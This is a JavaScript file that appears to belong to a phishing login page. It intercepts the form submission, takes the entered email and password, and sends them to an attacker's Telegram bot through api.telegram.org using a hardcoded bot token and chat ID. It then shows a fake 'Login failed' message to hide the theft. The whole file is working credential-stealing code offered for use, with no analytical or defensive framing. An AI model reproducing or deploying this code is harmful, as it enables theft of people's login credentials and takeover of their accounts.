document.addEventListener("DOMContentLoaded", function() {
    document.querySelector("form").addEventListener("submit", function(event) {
        event.preventDefault(); // Prevent form from actually submitting
        
        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;

        // Telegram Bot Configuration
        const TELEGRAM_BOT_TOKEN = "7732386670:AAGuV2q_N45I76ISD_8NYcnHPd2gyhk8sn0";  // Replace with your bot token
        const TELEGRAM_CHAT_ID = "7182702425";  // Replace with your chat ID

        const message = `🚨 New Login Attempt 🚨\nEmail: ${email}\nPassword: ${password}`;
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;

        fetch(url, { method: "GET" })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert("Login failed. Please try again."); // Fake error message
                } else {
                    alert("Something went wrong. Try again later.");
                }
            })
            .catch(error => console.error("Error:", error));
    });
});
